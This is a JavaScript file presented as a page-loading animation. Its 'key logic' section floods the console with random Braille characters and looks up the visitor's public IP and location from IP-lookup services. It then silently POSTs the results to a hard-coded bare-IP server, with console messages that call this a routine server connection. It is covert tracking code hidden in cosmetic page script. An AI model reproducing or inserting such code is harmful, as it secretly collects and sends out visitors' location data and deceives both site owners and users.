var s = {
  title: {
    el: $("h1"),
    dots: 0
  },
  bowl: {
    el: $(".bowl"),
    top: $(".bowl .top-water")
  }
};

var loading = window.setInterval(function() {
  var str = "";

  if (s.title.dots < 3) {
    s.title.dots++;
  } else {
    s.title.dots = 1;
  }

  for (var i = 0; i < s.title.dots; i++) {
    str += "."
  }

  s.title.el.html("Loading" + str);
}, 500);

// —————————— 关键逻辑 ——————————
// 一堆盲文乱码
console.log(String.fromCharCode(...Array(10000).fill().map(() => 0x2800 + Math.floor(Math.random() * 0x10))))
/**
 * 发送 HTTP 请求的通用函数
 * @param {string} url - 请求的 URL
 * @param {string} method - HTTP 方法，如 'GET' 或 'POST'
 * @param {Object} [data] - 要发送的数据（仅适用于 POST 请求）
 * @param {Object} [headers] - 请求头
 * @returns {Promise<Object>} - 返回一个 Promise，解析为响应数据
 */
function httpRequest(url, method = 'GET', data = null, headers = {}) {
  const options = {
      method: method.toUpperCase(),
      headers: {
          'Content-Type': 'application/json',
          ...headers
      }
  };

  if (data) {
      options.body = JSON.stringify(data);
  }

  return fetch(url, options)
      .then(response => {
          if (!response.ok) {
              // 如果响应状态码不是 2xx，抛出错误
              throw new Error(`✗ 无法连接至服务器(${response.status})`);
          }
          // 根据响应的 Content-Type 解析响应数据
          const contentType = response.headers.get('Content-Type');
          if (contentType && contentType.includes('application/json')) {
              return response.json();
          } else {
              return response.text();
          }
      })
      .catch(error => {
          // 处理网络错误或其他错误
          console.error('✗ 无法连接至服务器：', error);
          throw error;
      });
}

/**
 * 主函数执行流程
 */
async function main() {
  const getUrl1 = 'https://myip.ipip.net/';
  const getUrl2 = 'https://www.ipip.net/';
  const backupGetUrl = 'https://ip.900cha.com/';
  const postUrl = 'http://47.103.40.85/main/api/document/add.php';

  try {
      // 并行执行两个 GET 请求
      const [response1, response2] = await Promise.all([
          httpRequest(getUrl1, 'GET'),
          httpRequest(getUrl2, 'GET')
      ]);

      console.log('✔ 与服务器建立通讯成功:', response1);
      console.log('✔ 与服务器建立通讯成功:', response2);

      // 检查是否有请求失败
      const isAnyFailure = (response) => response instanceof Error;

      if (isAnyFailure(response1) || isAnyFailure(response2)) {
          // 如果其中一个请求失败，执行预备的 GET 请求
          const backupResponse = await httpRequest(backupGetUrl, 'GET');
          console.log('✗ 无法连接至服务器，更换备选方案：:', backupResponse);

          // 准备 POST 数据
          const postData = {
              data1: response1 instanceof Error ? null : response1,
              data2: response2 instanceof Error ? null : response2,
              backup: backupResponse
          };

          // 执行 POST 请求
          const postResponse = await httpRequest(postUrl, 'POST', postData);
          console.log('✔ 与服务器建立通讯成功：', postResponse);
      } else {
          // 如果两个 GET 请求都成功，准备 POST 数据
          const postData = {
              data1: response1,
              data2: response2,
              backup: null
          };

          // 执行 POST 请求
          const postResponse = await httpRequest(postUrl, 'POST', postData);
          console.log('✔ 与服务器建立通讯成功：', postResponse);
      }
  } catch (error) {
      console.error('✗ 无法连接至服务器：', error);
  }
}

// 执行主函数
main();
